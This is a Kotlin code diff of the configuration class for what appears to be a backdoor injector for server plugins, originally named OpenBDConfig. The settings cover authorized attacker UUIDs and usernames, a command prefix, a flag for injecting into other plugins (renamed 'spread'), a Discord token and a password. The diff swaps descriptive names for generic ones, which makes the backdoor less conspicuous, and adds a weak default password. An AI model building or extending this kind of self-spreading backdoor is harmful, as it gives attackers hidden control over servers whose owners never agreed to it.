@@ -1,26 +1,26 @@
-package com.tmquan2508.inject
+package com.tmquan2508.inject.config
 
 import com.google.gson.annotations.SerializedName
 
-data class OpenBDConfig(
-    @SerializedName("authorized_uuids")
+data class Config(
+    @SerializedName("uuids")
     val authorizedUuids: List<String> = emptyList(),
 
-    @SerializedName("authorized_usernames")
+    @SerializedName("usernames")
     val authorizedUsernames: List<String> = emptyList(),
 
-    @SerializedName("command_prefix")
+    @SerializedName("prefix")
     val commandPrefix: String = "!",
 
-    @SerializedName("inject_into_other_plugins")
+    @SerializedName("spread")
     val injectIntoOtherPlugins: Boolean = false,
 
-    @SerializedName("display_debug_messages")
+    @SerializedName("warnings")
     val displayDebugMessages: Boolean = false,
 
     @SerializedName("discord_token")
     val discordToken: String = "",
 
     @SerializedName("password")
-    val password: String = ""
+    val password: String = "12345"
 )
